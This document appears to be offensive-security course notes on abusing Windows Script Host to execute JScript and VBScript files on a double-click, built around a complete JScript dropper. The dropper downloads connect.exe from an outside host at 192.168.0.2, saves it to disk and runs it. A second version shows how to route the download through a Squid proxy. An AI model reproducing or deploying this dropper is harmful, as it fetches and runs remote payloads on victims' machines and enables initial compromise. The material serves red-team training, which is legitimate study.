Jscript is a dialect of JavaScript developed and owned by Microsoft that is used in Internet Explorer. It can also be executed outside the browser through the Windows Script Host,wsh which can execute scripts in a variety of languages.
When executed outside of a web browser, Jscript is not subject to any of the security restrictions enforced by a browser sandbox. This means we can use it as a client-side code execution vector without exploiting any vulnerabilities.
The default application for .js files is the Windows-Based Script Host. This means that if we double-click a .js file, the content will be executed.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/66061e9b-242f-4e59-be01-f80bc4dd6236" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ed7eb9bf-fe97-4226-97ae-0c5f76bf76f9" />

While .ps1 open with notepad, .js will be executed
<img width="816" height="329" alt="image" src="https://github.com/user-attachments/assets/59e5e472-699f-4ea0-b108-806cb9c3089b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/26f1edbd-b43e-4317-9c7a-b70682543807" />

Also .vbs files
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2639191e-457c-45b0-a88c-df91438c1e7d" />

## Jscript Dropper

code dropper.js
```
var url = "http://192.168.0.2/connect.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200)
{var Stream = WScript.CreateObject('ADODB.Stream');
Stream.Open();
Stream.Type = 1; // adTypeBinary
Stream.Write(Object.ResponseBody);
Stream.Position = 0;
Stream.SaveToFile("connect.exe", 2);
Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("connect.exe");
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3578ee22-9bdc-49a6-a334-e7671bf85bb1" />


To make your JScript proxy-aware using the setProxy method of the MSXML2.XMLHTTP object, you need to add a line before the Open or Send method.

Since your Squid proxy is running on the Windows 10 development machine, the proxy address will be 127.0.0.1 (localhost). Squid's default listening port is usually 3128.

Here is the modified code:
```
var url = "http://192.168.0.2/connect.exe";
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

// --- PROXY CONFIGURATION ---
// Parameter 1 (2): SXH_PROXY_SET_PROXY (Use manual proxy settings)
// Parameter 2 ("127.0.0.1:3128"): The Squid proxy address and port
// Parameter 3 (""): Bypass list (empty means route everything through the proxy)
Object.setProxy(2, "127.0.0.1:3128", ""); 
// ---------------------------

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200) {
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1; // adTypeBinary
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("connect.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("connect.exe");
```

Explanation of the setProxy parameters:
2: This is the proxySetting integer. It stands for SXH_PROXY_SET_PROXY, which tells the object to use a manually specified proxy.

"127.0.0.1:3128": This is the proxyServer string. If your Squid server is configured on a different port (e.g., 8080), you must change 3128 to match your Squid configuration.

"": This is the bypassList. If you want local addresses (like 192.168.0.2) to bypass the proxy, you could use "<local>" or a specific list of IPs separated by semicolons. Leaving it empty forces all traffic through Squid.

Note: If the MSXML version you are using requires explicit protocol mapping, you can alternatively write the proxy string as "http=127.0.0.1:3128". However, "127.0.0.1:3128" usually works perfectly for standard HTTP requests in MSXML2.
